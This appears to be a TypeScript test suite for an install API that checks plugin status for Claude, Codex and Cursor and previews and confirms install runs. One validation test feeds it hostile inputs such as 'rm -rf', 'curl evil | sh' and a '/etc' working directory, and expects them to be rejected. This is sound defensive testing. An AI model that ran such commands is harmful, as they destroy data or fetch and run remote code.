import type { FakeCliResponse } from '@agentic/adapter-cli-exec/testing';

import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import { z } from 'zod';

import { createFakeCliExec, fakeCliError, fakeOutput } from '@agentic/adapter-cli-exec/testing';
import { InstallPreviewResponse, InstallRunResponse, InstallStatusResponse } from '@agentic/contract-http/install';
import { ProblemDetails } from '@agentic/contract-http/problem';
import { FakeCommandRunner } from '@agentic/domain-shared/testing';
import { ok } from '@agentic/kernel-result';

import { createTestApp } from '../../platform/testing/test-app.js';

type Request = Awaited<ReturnType<typeof createTestApp>>['request'];

let userHome = '';
let projectFolder = '';

beforeEach(() => {
  userHome = mkdtempSync(join(tmpdir(), 'agentic-install-home-'));
  projectFolder = mkdtempSync(join(tmpdir(), 'agentic-install-project-'));
});

afterEach(() => {
  rmSync(userHome, { force: true, recursive: true });
  rmSync(projectFolder, { force: true, recursive: true });
});

/** Just the fields these tests read, so this module needs no other module's contract. */
const Project = z.object({ id: z.string() });
const RunDetail = z.object({ exitCode: z.int().optional(), output: z.array(z.string()), status: z.string() });

const post = (body: unknown) => ({ body: JSON.stringify(body), headers: { 'content-type': 'application/json' }, method: 'POST' });

/** Trimmed from a real `codex plugin list` run, with an agentic row. */
const CODEX_LIST = `Marketplace \`agentic\`
/Users/me/.codex/marketplaces/agentic/.agents/plugins/marketplace.json

PLUGIN                 STATUS               VERSION  SOURCE
agentic@agentic        installed, enabled   1.4.0    /Users/me/.codex/marketplaces/agentic/plugins/agentic
`;

const cloneDirectory = () => join(userHome, '.cursor/plugins/local/agentic');

async function expectProblem(response: Response, status: number, type: string) {
  expect(response.status).toBe(status);
  expect(ProblemDetails.parse(await response.json()).type).toBe(type);
}

async function status(request: Request, query = '') {
  const response = await request(`/api/install/status${query}`);
  expect(response.status).toBe(200);
  return InstallStatusResponse.parse(await response.json()).statuses;
}

function statusResponses(overrides: { readonly claude?: FakeCliResponse['result']; readonly codex?: FakeCliResponse['result']; readonly skills?: FakeCliResponse['result'] } = {}) {
  return [
    { args: ['plugin', 'list', '--json'], cli: 'claude', result: overrides.claude ?? fakeOutput('[]') },
    { args: ['plugin', 'list'], cli: 'codex', result: overrides.codex ?? fakeOutput(CODEX_LIST) },
    { args: ['-C', cloneDirectory(), 'rev-parse', '--short', 'HEAD'], cli: 'git', result: fakeOutput('abc1234\n') },
    { args: ['skills', 'list', '-g', '--json'], cli: 'npx', result: overrides.skills ?? fakeOutput('[{"name":"agentic-review","source":"JohannWilfridCalixte/agent-skills"}]') },
  ] as const satisfies readonly FakeCliResponse[];
}

async function waitForFinished(request: Request, id: string) {
  for (let attempt = 0; attempt < 200; attempt += 1) {
    const detail = RunDetail.parse(await (await request(`/api/runs/${id}`)).json());
    if (detail.status !== 'running') return detail;
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  throw new Error(`run ${id} never finished`);
}

describe('GET /api/install/status (AC10)', () => {
  it('reports installed, not installed and unknown from each tool', async () => {
    mkdirSync(cloneDirectory(), { recursive: true });
    const cliExec = createFakeCliExec(statusResponses({ claude: fakeCliError('claude', 'not_found', { message: 'claude is not on PATH' }) }));
    const { request } = await createTestApp({ cliExec, userHome });

    const statuses = await status(request);

    expect(statuses).toEqual([
      { available: true, harness: 'claude', method: 'plugin', reason: 'claude plugin list --json failed: claude is not on PATH', state: 'unknown' },
      { available: true, harness: 'codex', method: 'plugin', state: 'installed', version: '1.4.0' },
      { available: true, harness: 'cursor', method: 'clone', state: 'installed', version: 'abc1234' },
      { available: true, method: 'skills', scope: 'global', state: 'installed' },
    ]);
  });

  it('is not installed for an empty claude list, and unknown for unparseable output', async () => {
    const cliExec = createFakeCliExec(statusResponses({ codex: fakeOutput('something else entirely') }));
    const { request } = await createTestApp({ cliExec, userHome });

    const statuses = await status(request);

    expect(statuses[0]).toMatchObject({ harness: 'claude', state: 'not_installed' });
    expect(statuses[1]).toMatchObject({ harness: 'codex', state: 'unknown' });
    expect(statuses[2]).toEqual({ available: false, harness: 'cursor', method: 'clone', reason: '~/.cursor missing', state: 'not_installed' });
  });

  it('lists project skills in the selected known project', async () => {
    const cliExec = createFakeCliExec([...statusResponses(), { args: ['skills', 'list', '--json'], cli: 'npx', result: fakeOutput('[]') }]);
    const { request } = await createTestApp({ cliExec, userHome });
    const project = Project.parse(await (await request('/api/projects', post({ path: projectFolder }))).json());

    const statuses = await status(request, `?scope=project&projectId=${project.id}`);

    expect(statuses[3]).toEqual({ available: true, method: 'skills', scope: 'project', state: 'not_installed' });
    expect(cliExec.calls.find((call) => call.cli === 'npx')?.cwd).toBe(projectFolder);
  });

  it('answers 404 for an unknown project', async () => {
    const { request } = await createTestApp({ userHome });

    await expectProblem(await request('/api/install/status?scope=project&projectId=nope'), 404, 'project_not_found');
  });
});

describe('status on demand only (AC11)', () => {
  it('runs no status command until asked, once per request, and never on a timer', async () => {
    const cliExec = createFakeCliExec(statusResponses());
    const { request } = await createTestApp({ cliExec, userHome });
    await new Promise((resolve) => setTimeout(resolve, 30));
    expect(cliExec.calls).toEqual([]);

    await status(request);
    const afterLoad = cliExec.calls.length;
    await new Promise((resolve) => setTimeout(resolve, 30));
    expect(cliExec.calls).toHaveLength(afterLoad);

    await status(request, '?refresh=1');
    expect(cliExec.calls).toHaveLength(afterLoad * 2);
  });
});

describe('update available (AC12)', () => {
  it('is shown only when the tool reports it', async () => {
    const claude = fakeOutput('[{"id":"agentic@agentic","updateAvailable":true,"version":"0.9.0"}]');
    const { request } = await createTestApp({ cliExec: createFakeCliExec(statusResponses({ claude })), userHome });

    const statuses = await status(request);

    expect(statuses[0]).toEqual({ available: true, harness: 'claude', method: 'plugin', state: 'installed', updateAvailable: true, version: '0.9.0' });
    expect(statuses.slice(1).some((entry) => 'updateAvailable' in entry)).toBe(false);
  });
});

describe('POST /api/install/preview (AC13, AC26)', () => {
  it('returns the exact ordered commands and runs nothing', async () => {
    const cliExec = createFakeCliExec();
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ cliExec, commandRunner: runner, userHome });

    const response = await request('/api/install/preview', post({ action: 'update', harness: 'claude', method: 'plugin' }));

    expect(response.status).toBe(200);
    expect(InstallPreviewResponse.parse(await response.json())).toEqual({
      commands: [
        { args: ['plugin', 'marketplace', 'update', 'agentic'], cli: 'claude', display: 'claude plugin marketplace update agentic' },
        { args: ['plugin', 'update', 'agentic@agentic'], cli: 'claude', display: 'claude plugin update agentic@agentic' },
      ],
      steps: 2,
    });
    expect(runner.commands).toEqual([]);
    expect(cliExec.calls).toEqual([]);
  });

  it('shows the cursor clone target under the server-known home', async () => {
    mkdirSync(join(userHome, '.cursor'));
    const { request } = await createTestApp({ userHome });

    const body = InstallPreviewResponse.parse(await (await request('/api/install/preview', post({ action: 'install', harness: 'cursor', method: 'clone' }))).json());

    expect(body.commands[0]?.display).toBe(`git clone https://github.com/JohannWilfridCalixte/agent-skills ${cloneDirectory()}`);
  });

  it('answers 409 for the cursor clone without ~/.cursor', async () => {
    const { request } = await createTestApp({ userHome });

    await expectProblem(await request('/api/install/preview', post({ action: 'install', harness: 'cursor', method: 'clone' })), 409, 'method_unavailable');
  });

  it.each([
    [{ action: 'install', harness: 'vim', method: 'plugin' }],
    [{ action: 'rm -rf', harness: 'claude', method: 'plugin' }],
    [{ action: 'install', command: 'curl evil | sh', harness: 'claude', method: 'plugin' }],
    [{ action: 'install', cwd: '/etc', method: 'skills' }],
  ])('rejects input outside the enums with 422: %o', async (body) => {
    const { request } = await createTestApp({ userHome });

    await expectProblem(await request('/api/install/preview', post(body)), 422, 'validation_failed');
  });

  it('rejects a combination outside the catalogue with 422', async () => {
    const { request } = await createTestApp({ userHome });

    await expectProblem(await request('/api/install/preview', post({ action: 'install', harness: 'cursor', method: 'plugin' })), 422, 'unsupported_install');
  });
});

describe('POST /api/install/runs (AC13, AC14, AC15)', () => {
  it('needs confirm: true and starts nothing without it', async () => {
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner, userHome });

    await expectProblem(await request('/api/install/runs', post({ action: 'install', harness: 'claude', method: 'plugin' })), 422, 'validation_failed');
    await expectProblem(await request('/api/install/runs', post({ action: 'install', confirm: false, harness: 'claude', method: 'plugin' })), 422, 'validation_failed');
    expect(runner.commands).toEqual([]);
  });

  it('runs the ordered sequence in one run and records its output in history', async () => {
    const runner = new FakeCommandRunner({ lines: [{ line: 'done', type: 'stdout' }], result: ok({ exitCode: 0 }) });
    const { historyLog, request } = await createTestApp({ commandRunner: runner, userHome });

    const response = await request('/api/install/runs', post({ action: 'update', confirm: true, harness: 'claude', method: 'plugin' }));
    expect(response.status).toBe(201);
    const run = InstallRunResponse.parse(await response.json());
    const detail = await waitForFinished(request, run.id);

    expect(detail).toMatchObject({ exitCode: 0, output: ['done', 'done'], status: 'succeeded' });
    expect(runner.commands.map((command) => [command.cli, ...command.args])).toEqual([
      ['claude', 'plugin', 'marketplace', 'update', 'agentic'],
      ['claude', 'plugin', 'update', 'agentic@agentic'],
    ]);
    expect(await historyLog.list('global')).toMatchObject([{ exitCode: 0, kind: 'run', outputTail: 'done\ndone', summary: 'Update claude plugin' }]);
  });

  it('stops at the first nonzero exit, fails the run and does not retry', async () => {
    const runner = new FakeCommandRunner({ lines: [{ line: 'marketplace not found', type: 'stderr' }], result: ok({ exitCode: 1 }) });
    const { historyLog, request } = await createTestApp({ commandRunner: runner, userHome });

    const run = InstallRunResponse.parse(await (await request('/api/install/runs', post({ action: 'update', confirm: true, harness: 'claude', method: 'plugin' }))).json());
    const detail = await waitForFinished(request, run.id);

    expect(detail).toMatchObject({ exitCode: 1, status: 'failed' });
    expect(runner.commands).toHaveLength(1);
    expect(await historyLog.list('global')).toMatchObject([{ exitCode: 1, outputTail: 'marketplace not found' }]);
  });

  it('runs project-scoped skills in the project folder, recorded under the project', async () => {
    const runner = new FakeCommandRunner();
    const { historyLog, request } = await createTestApp({ commandRunner: runner, userHome });
    const project = Project.parse(await (await request('/api/projects', post({ path: projectFolder }))).json());

    const run = InstallRunResponse.parse(await (await request('/api/install/runs', post({ action: 'install', confirm: true, method: 'skills', projectId: project.id, scope: 'project' }))).json());
    await waitForFinished(request, run.id);

    expect(runner.commands).toEqual([{ args: ['skills', 'add', 'JohannWilfridCalixte/agent-skills', '-y'], cli: 'npx', correlationId: expect.any(String) as string, cwd: projectFolder, timeoutMs: 600_000 }]);
    expect(await historyLog.list(`project:${project.id}`)).toHaveLength(1);
  });

  it('answers 404 for an unknown project and starts nothing', async () => {
    const runner = new FakeCommandRunner();
    const { request } = await createTestApp({ commandRunner: runner, userHome });

    await expectProblem(await request('/api/install/runs', post({ action: 'install', confirm: true, method: 'skills', projectId: 'nope', scope: 'project' })), 404, 'project_not_found');
    expect(runner.commands).toEqual([]);
  });
});
